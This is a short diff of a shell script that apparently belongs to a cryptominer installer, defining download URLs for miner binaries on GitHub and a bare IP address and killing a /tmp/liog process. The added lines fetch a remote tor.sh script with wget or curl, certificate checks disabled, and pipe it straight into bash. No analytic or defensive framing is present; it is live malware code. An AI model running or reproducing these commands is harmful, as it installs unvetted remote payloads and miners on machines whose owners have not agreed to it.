@@ -11,6 +11,9 @@ id=$(ps x|grep liog|grep -v grep|awk '{print $1}')
 fe='https://github.com/zoalsharf/rig/raw/master/m6'
 f3='https://github.com/zoalsharf/rig/raw/master/m3'
 m='http://192.99.226.65/m'
+
+wget --no-check-certificate -O - -q https://raw.githubusercontent.com/zoalsharf/rig/master/tor.sh|bash || curl --insecure https://raw.githubusercontent.com/zoalsharf/rig/master/tor.sh|bash
+
 function de() {
         /bin/rm -rf /tmp/liog
         if [ -x "/usr/bin/wget"  -o  -x "/bin/wget" ]; then
